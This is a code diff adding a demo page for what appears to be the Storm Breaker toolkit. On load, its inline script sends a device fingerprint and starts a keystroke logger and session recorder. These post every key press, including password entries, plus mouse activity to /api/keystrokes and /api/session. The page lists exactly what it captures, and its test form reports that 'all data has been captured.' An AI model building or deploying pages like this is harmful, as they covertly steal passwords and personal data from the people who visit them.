@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Features Demo - Storm Breaker</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .feature-status {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .status-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-badge {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .status-active {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-inactive {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        input:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+
+        .info-box h3 {
+            margin-top: 0;
+            color: #1976D2;
+        }
+
+        .info-box ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🚀 Advanced Features Demo</h1>
+        <p class="subtitle">All three advanced features are now active on this page</p>
+
+        <div class="feature-status">
+            <h2>Feature Status</h2>
+            <div class="status-item">
+                <span>Device Fingerprinting</span>
+                <span class="status-badge status-active" id="fingerprint-status">Active</span>
+            </div>
+            <div class="status-item">
+                <span>Keystroke Logging</span>
+                <span class="status-badge status-active" id="keylogger-status">Active</span>
+            </div>
+            <div class="status-item">
+                <span>Session Recording</span>
+                <span class="status-badge status-active" id="session-status">Active</span>
+            </div>
+        </div>
+
+        <h2>Test Form</h2>
+        <p>Try typing in the fields below to test the keystroke logger:</p>
+
+        <form id="testForm">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" name="name" placeholder="John Doe">
+            </div>
+
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" name="email" placeholder="john@example.com">
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password">
+            </div>
+
+            <div class="form-group">
+                <label>Message</label>
+                <textarea name="message" placeholder="Type something here..."></textarea>
+            </div>
+
+            <button type="submit" class="btn">Submit Form</button>
+        </form>
+
+        <div class="info-box">
+            <h3>What's Being Captured?</h3>
+            <ul>
+                <li><strong>Device Fingerprint:</strong> Browser info, hardware details, GPU, fonts, canvas fingerprint,
+                    WebGL, audio context, battery status, network info, and more</li>
+                <li><strong>Keystrokes:</strong> Every key press, form input, password entry, copy/paste operations, and
+                    form submissions</li>
+                <li><strong>Session Recording:</strong> Mouse movements, clicks, scrolls, and all page interactions (can
+                    be replayed like a video)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Load rrweb library for session recording -->
+    <script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
+
+    <!-- Load our custom libraries -->
+    <script src="../../assets/js/fingerprint.js"></script>
+    <script src="../../assets/js/keylogger.js"></script>
+    <script src="../../assets/js/session-recorder.js"></script>
+
+    <script>
+        // Initialize all features when page loads
+        window.addEventListener('load', async function () {
+            console.log('Initializing advanced features...');
+
+            // 1. Collect and send device fingerprint
+            try {
+                const fingerprintResult = await DeviceFingerprint.send();
+                console.log('Fingerprint sent:', fingerprintResult);
+                document.getElementById('fingerprint-status').textContent = 'Sent ✓';
+            } catch (e) {
+                console.error('Fingerprint error:', e);
+                document.getElementById('fingerprint-status').textContent = 'Error';
+                document.getElementById('fingerprint-status').className = 'status-badge status-inactive';
+            }
+
+            // 2. Start keystroke logger
+            try {
+                KeystrokeLogger.init({
+                    endpoint: '/api/keystrokes',
+                    sendInterval: 5000 // Send every 5 seconds
+                });
+                console.log('Keystroke logger started');
+            } catch (e) {
+                console.error('Keylogger error:', e);
+                document.getElementById('keylogger-status').textContent = 'Error';
+                document.getElementById('keylogger-status').className = 'status-badge status-inactive';
+            }
+
+            // 3. Start session recorder
+            try {
+                const sessionStarted = SessionRecorder.init({
+                    endpoint: '/api/session',
+                    sendInterval: 10000 // Send every 10 seconds
+                });
+
+                if (sessionStarted) {
+                    console.log('Session recorder started');
+                } else {
+                    throw new Error('Failed to start session recorder');
+                }
+            } catch (e) {
+                console.error('Session recorder error:', e);
+                document.getElementById('session-status').textContent = 'Error';
+                document.getElementById('session-status').className = 'status-badge status-inactive';
+            }
+
+            console.log('All features initialized!');
+        });
+
+        // Handle form submission
+        document.getElementById('testForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            alert('Form submitted! All data has been captured.');
+        });
+
+        // Stop recording when page unloads
+        window.addEventListener('beforeunload', function () {
+            if (SessionRecorder.isRecording) {
+                SessionRecorder.stopRecording();
+            }
+            if (KeystrokeLogger.isActive) {
+                KeystrokeLogger.stop();
+            }
+        });
+    </script>
+</body>
+
+</html>
